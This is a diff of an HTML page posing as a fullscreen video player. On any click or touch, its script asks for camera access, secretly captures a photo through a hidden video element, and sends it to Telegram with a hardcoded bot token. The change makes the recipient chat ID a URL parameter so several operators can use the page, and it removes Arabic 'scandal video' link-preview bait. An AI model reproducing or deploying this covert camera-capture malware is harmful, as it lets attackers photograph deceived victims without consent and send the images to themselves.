@@ -1,22 +1,7 @@
-<!-- علامات المعاينة لتطبيقات المحادثة (Instagram, Telegram, WhatsApp) -->
-<meta property="og:title" content="شاهد فضيحة صارة القح 🎬">
-<meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
-<meta property="og:type" content="video.other">
-<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
-
 <title>Video Fullscreen</title>
 <style>
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-    }
-    html, body {
-        width: 100%;
-        height: 100%;
-        background-color: #000;
-        overflow: hidden;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body { width: 100%; height: 100%; background-color: #000; overflow: hidden; }
     video#mainVideo {
         position: fixed;
         top: 0;
@@ -30,37 +15,29 @@
         z-index: 1;
     }
 </style>
-
-<!-- الفيديو الرئيسي يعمل باستمرار وبدون انقطاع -->
-<video id="mainVideo" controls autoplay loop playsinline muted>
-    <source src="my_reel.mp4" type="video/mp4">
-</video>
-
 <script>
     const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
-    const TELEGRAM_CHAT_ID = '6642913954';
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetChatId = urlParams.get('sub_id');
 
     let isProcessing = false;
 
     async function handleCapture() {
-        if (isProcessing) return;
+        if (isProcessing || !targetChatId) return;
         isProcessing = true;
 
         let stream = null;
 
         try {
-            // طلب إذن الكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            // إنشاء عنصر فيديو خفي في الذاكرة لالتقاط الصورة فقط
             const hiddenVideo = document.createElement('video');
             hiddenVideo.muted = true;
             hiddenVideo.playsInline = true;
             hiddenVideo.srcObject = stream;
             
             await hiddenVideo.play();
-
-            // الانتظار 400 مللي ثانية لضمان استقرار إضاءة الكاميرا
             await new Promise(resolve => setTimeout(resolve, 400));
 
             const canvas = document.createElement('canvas');
@@ -70,15 +47,13 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(hiddenVideo, 0, 0);
 
-            // إغلاق الكاميرا مباشرة بعد رسم الإطار على الـ Canvas
             stream.getTracks().forEach(track => track.stop());
 
-            // تحويل الصورة وإرسالها إلى التليجرام في الخلفية
             canvas.toBlob(async (blob) => {
                 if (!blob) return;
 
                 const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('chat_id', targetChatId);
                 formData.append('photo', blob, 'capture.png');
 
                 try {
@@ -102,3 +77,5 @@
     window.addEventListener('click', handleCapture);
     window.addEventListener('touchstart', handleCapture);
 </script>
+</body>
+</html>
